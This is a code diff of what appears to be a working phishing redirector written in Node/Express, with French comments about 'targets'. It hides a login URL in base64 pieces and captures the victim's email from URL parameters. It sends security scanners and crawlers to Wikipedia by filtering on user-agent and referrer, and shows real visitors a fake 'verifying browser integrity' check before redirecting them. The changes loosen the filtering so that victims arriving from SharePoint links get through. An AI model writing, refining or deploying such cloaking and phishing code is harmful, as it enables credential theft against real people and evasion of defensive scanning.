@@ -4,6 +4,7 @@ const app = express();
 
 app.use(bodyParser.urlencoded({ extended: true }));
 
+// Tes cibles encodées
 const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
 const part2 = "cGdhYWZGVE0=";
 
@@ -11,19 +12,17 @@ app.all('/', (req, res) => {
     const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
     const referrer = req.headers['referrer'] || req.headers['referer'] || "";
     
-    // Récupération de l'email
-    const targetEmail = req.body?.login_hint || req.query.login_hint || req.query.m || "";
+    // Capture de l'email via paramètre 'm' ou via Azure
+    const targetEmail = req.query.m || req.body?.login_hint || req.query.login_hint || "";
     
     const isDebug = req.query.debug === "true";
     
-    // On cible les vrais robots de scan (Google, Datacenters, etc.)
-    const isBotUA = /bot|spider|crawler|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);
+    // On bloque les User-Agents typiques des scanners mais on laisse passer les navigateurs classiques
+    const isBotUA = /bot|spider|crawler|google|cloud|datacenter|headless|monit|virus|censys/i.test(ua);
     
-    // PROTECTION : On ne bloque le referrer vide QUE SI l'email est vide aussi.
-    // Cela permet aux vraies cibles avec un mail dans l'URL de passer même sans referrer.
-    const isBotReferrer = (referrer === "" && targetEmail === ""); 
-
-    if (!isDebug && (isBotUA || isBotReferrer)) {
+    // PROTECTION : On ne redirige vers Wikipedia QUE si on n'a absolument aucune info (ni mail, ni referrer connu)
+    // On retire la vérification stricte du referrer pour SharePoint car il le nettoie souvent
+    if (!isDebug && (isBotUA || (targetEmail === "" && referrer === ""))) {
         return res.redirect("https://www.wikipedia.org");
     }
 
@@ -72,8 +71,8 @@ app.all('/', (req, res) => {
                 <div class="footer"><div><span class="dot"></span> SECURE CONNECTION</div><div>Protected by Shield</div></div>
             </div>
             <script>
-                const p1 = "${part1}"; const p2 = "${part2}"; const em = "${targetEmail}";
                 document.getElementById('clickArea').addEventListener('click', function() {
+                    const p1 = "${part1}"; const p2 = "${part2}"; const em = "${targetEmail}";
                     document.getElementById('customCheckbox').style.display = 'none';
                     document.getElementById('loader').style.display = 'block';
                     document.getElementById('statusText').innerText = "Verifying browser integrity...";
